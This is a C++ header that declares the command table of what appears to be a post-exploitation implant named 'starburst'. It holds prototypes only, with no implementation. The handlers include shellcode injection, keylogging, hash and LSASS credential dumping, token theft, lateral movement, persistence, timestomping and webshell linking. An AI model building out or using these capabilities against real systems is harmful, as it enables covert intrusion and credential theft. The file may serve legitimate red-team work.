#ifndef STARBURST_COMMANDS_H
#define STARBURST_COMMANDS_H

#include <common.h>
#include <parser.h>

namespace starburst {

    typedef void (*CmdHandler)( instance& inst, char* task_uuid, Parser* params );

    struct CmdEntry {
        uint8_t    id;
        CmdHandler handler;
    };

    auto declfn cmd_exit( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_sleep( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_shell( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_whoami( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_pwd( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_cd( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_ls( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_ps( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_config( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_upload( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_download( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_shinject( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_execute_pic( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_cat( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_mkdir( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_rm( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_cp( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_mv( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_env( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_reg_query( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_screenshot( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_token_list( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_execute_assembly( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_execute_coff( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_jump_psexec( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_jump_scshell( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_jump_wmiexec( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_jump_dcomexec( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_ifconfig( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_netstat( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_kill( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_run( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_getprivs( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_listpipes( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_reg_write_value( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_make_token( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_steal_token( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_rev2self( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_net_localgroup( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_net_localgroup_member( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_jobkill( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_link( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_unlink( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_download_resp( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_socks( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_ssh( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_rpfwd( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_migrate( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_blockdlls( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_keylog( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_enumdesktops( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_timestomp( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_localtime( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_idletime( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_getuid( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_browserpivot( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_connect( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_disconnect( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_powerpick( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_spawnto_x64( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_spawnto_x86( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_spawn( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_arp( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_drives( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_uptime( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_net_sessions( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_net_shares( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_net_loggedon( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_clipboard( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_windows( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_reg_delete( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_reg_create_key( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_persist_run( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_persist_schtask( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_persist_service( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_ppid_spoof( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_argue( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_runas( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_hashdump( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_lsass_dump( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_token_store( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_portscan( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_inline_execute( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_load( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_wmiexec( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_dcomexec( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_execute_bofpe( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_lldp_connect( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_lldp_disconnect( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_link_webshell( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn cmd_unlink_webshell( instance& inst, char* task_uuid, Parser* params ) -> void;
    auto declfn ws_poll_links( instance& inst ) -> void;
    auto declfn ws_link_send_msg( instance& inst, instance::WebshellLink* link,
                                   uint8_t* data, uint32_t len ) -> bool;

}

#endif
